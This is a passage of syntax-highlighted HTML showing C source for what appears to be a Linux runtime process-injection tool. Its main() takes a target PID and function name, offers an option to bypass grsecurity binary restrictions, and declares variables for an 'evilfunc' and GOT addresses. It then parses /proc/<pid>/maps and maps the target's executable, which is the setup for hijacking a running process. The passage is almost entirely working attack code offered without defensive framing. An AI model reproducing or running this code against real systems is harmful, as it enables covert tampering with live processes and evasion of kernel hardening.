&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span> main<span style="color: black;">(</span><span style="color: #993333;">int</span> argc, <span style="color: #993333;">char</span> **argv<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">char</span> meminfo<span style="color: black;">[</span><span style="color: #cc66cc;">20</span><span style="color: black;">]</span>, ps<span style="color: black;">[</span><span style="color: #cc66cc;">7</span><span style="color: black;">]</span>, buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>, tmp<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>, *p, *file;<br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #993333;">char</span> *<span style="color: #000000; font-weight: bold;">function</span>, et_dyn = <span style="color: #cc66cc;">0</span>, grsec = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; FILE *fd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> stat st;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> md, status;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr *phdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr text_vaddr, got_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr export, elf_base, dyn_mmap_got_addr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> evilfunc;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> linking_info *lp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> pid;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *libc;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argc &lt; <span style="color: #cc66cc;">3</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usage:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Usage: %s &lt;pid&gt; &lt;function&gt; [opts]<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"-d&nbsp; &nbsp; &nbsp; ET_DYN processes<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"-g&nbsp; &nbsp; &nbsp; bypass grsec binary flag restriction <span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"-2 &nbsp; &nbsp; &nbsp;Meant to be used as a secondary method of<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"finding sysenter with -g; if -g fails, then add -2<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"Example 1: %s &lt;pid&gt; &lt;function&gt; -g<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"Example 2: %s &lt;pid&gt; &lt;function&gt; -g -2<span style="color: #000099; font-weight: bold;">\n</span>"</span>, argv<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>,argv<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>,argv<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; i = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">[</span>i<span style="color: black;">]</span> &gt;= <span style="color: #ff0000;">'0'</span> &amp;&amp; argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">[</span>i<span style="color: black;">]</span> &lt;= <span style="color: #ff0000;">'9'</span><span style="color: black;">)</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i++;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>i != strlen<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> usage;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argc &gt; <span style="color: #cc66cc;">3</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'-'</span> &amp;&amp; argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'d'</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; et_dyn = <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'-'</span> &amp;&amp; argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'g'</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; grsec = <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> &amp;&amp; !strcmp<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span>, <span style="color: #ff0000;">"-2"</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; static_sysenter = <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Unrecognized option: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> usage;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; pid = atoi<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">function</span> = strdup<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"strdup"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;snprintf<span style="color: black;">(</span>meminfo, <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>meminfo<span style="color: black;">)</span><span style="color: #cc66cc;">-1</span>, <span style="color: #ff0000;">"/proc/%d/maps"</span>, pid<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>fd = fopen<span style="color: black;">(</span>meminfo, <span style="color: #ff0000;">"r"</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"PID: %i cannot be checked, /proc/%i/maps does not exist<span style="color: #000099; font-weight: bold;">\n</span>"</span>, pid, pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* ET_DYN */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>et_dyn<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>fgets<span style="color: black;">(</span>buf, MAXBUF<span style="color: #cc66cc;">-1</span>, fd<span style="color: black;">)</span><span style="color: black;">)</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span> &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strstr<span style="color: black;">(</span>buf, <span style="color: #ff0000;">"r-xp"</span><span style="color: black;">)</span> &amp;&amp; !strstr<span style="color: black;">(</span>buf, <span style="color: #ff0000;">".so"</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>tmp, buf, MAXBUF<span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>p = strchr<span style="color: black;">(</span>buf, <span style="color: #ff0000;">'-'</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *p = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\0</span>'</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text_base = strtoul<span style="color: black;">(</span>buf, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #cc66cc;">16</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strchr<span style="color: black;">(</span>tmp, <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose<span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"error parsing pid map<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>file = strdup<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>&amp;tmp<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"strdup"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i = <span style="color: #cc66cc;">0</span>;&nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>file<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\0</span>'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> next;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* ET_EXEC */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; fgets<span style="color: black;">(</span>buf, MAXBUF<span style="color: #cc66cc;">-1</span>, fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>tmp, buf, MAXBUF<span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strchr<span style="color: black;">(</span>tmp, <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose <span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"error parsing pid map<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>file = strdup<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>&amp;tmp<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"strdup"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; i = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>file<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; file<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\0</span>'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; next: <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>md = open<span style="color: black;">(</span>file, O_RDONLY<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"open"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>fstat<span style="color: black;">(</span>md, &amp;st<span style="color: black;">)</span> &lt; <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"fstat"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; mem = mmap<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, st.<span style="color: #202020;">st_size</span>, PROT_READ, MAP_PRIVATE, md, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>mem == MAP_FAILED<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"mmap"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
